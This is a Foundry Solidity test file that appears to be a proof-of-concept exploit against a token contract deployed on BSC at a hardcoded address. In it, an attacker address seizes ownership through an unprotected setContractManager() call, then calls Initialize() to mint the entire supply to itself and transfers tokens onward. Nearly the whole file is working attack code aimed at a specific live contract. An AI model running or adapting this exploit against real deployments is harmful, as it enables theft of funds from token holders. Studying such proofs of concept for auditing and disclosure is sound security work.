```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "forge-std/Test.sol";

interface IMetaVerseKombat {
    function setContractManager() external;
    function Initialize(address _marketingwallet, address router) external;
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function _sellTimeInterval() external view returns (uint256);
    function _sellTaxFee() external view returns (uint256);
    function _buyTaxFee() external view returns (uint256);
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
}

contract ExploitTest is Test {
    // Deployed contract on BSC
    address constant CONTRACT = 0x3405ff989F8bb8Efd6C85Ad6B29219D3383A5FB0;
    // PancakeSwap Router on BSC
    address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    // Marketing wallet used in Initialize
    address constant MARKETING_WALLET = 0x000000000000000000000000000000000000dEaD; // arbitrary

    IMetaVerseKombat mvk;

    function setUp() public {
        vm.label(CONTRACT, "MetaVerseKombat");
        vm.label(PANCAKE_ROUTER, "PancakeRouter");
        vm.label(MARKETING_WALLET, "MarketingWallet");
        mvk = IMetaVerseKombat(CONTRACT);
    }

    function testInitializationExploit() public {
        // ---- Step 1: Attacker calls setContractManager() to become owner ----
        address attacker = address(0xdeadbeef);
        vm.label(attacker, "Attacker");

        // Check current owner (should be address(0) if uninitialized)
        address currentOwner = mvk.owner();
        console.log("Current owner:", currentOwner);

        vm.startPrank(attacker);
        // The modifier ownerinitializer will pass only if ownerinited is false.
        // We assume the contract is not yet initialized.
        mvk.setContractManager();
        vm.stopPrank();

        // Verify attacker is now owner
        address newOwner = mvk.owner();
        console.log("New owner:", newOwner);
        assertEq(newOwner, attacker, "Attacker should be owner after setContractManager");

        // ---- Step 2: Attacker calls Initialize() to mint all tokens ----
        vm.startPrank(attacker);
        // Initialize requires onlyOwner (true) and initializer (inited must be false)
        mvk.Initialize(MARKETING_WALLET, PANCAKE_ROUTER);
        vm.stopPrank();

        // ---- Step 3: Verify attacker holds all tokens ----
        uint256 totalSupply = mvk.totalSupply();
        uint256 attackerBalance = mvk.balanceOf(attacker);
        console.log("Total supply:", totalSupply);
        console.log("Attacker balance:", attackerBalance);
        assertEq(attackerBalance, totalSupply, "Attacker should own all tokens after Initialize");

        // ---- Optional: confirm transfer works ----
        address victim = address(0xcafe);
        vm.prank(attacker);
        mvk.transfer(victim, 1000 * 10**uint256(mvk.decimals()));
        assertEq(mvk.balanceOf(victim), 1000 * 10**uint256(mvk.decimals()), "Transfer should work");
    }
}
```
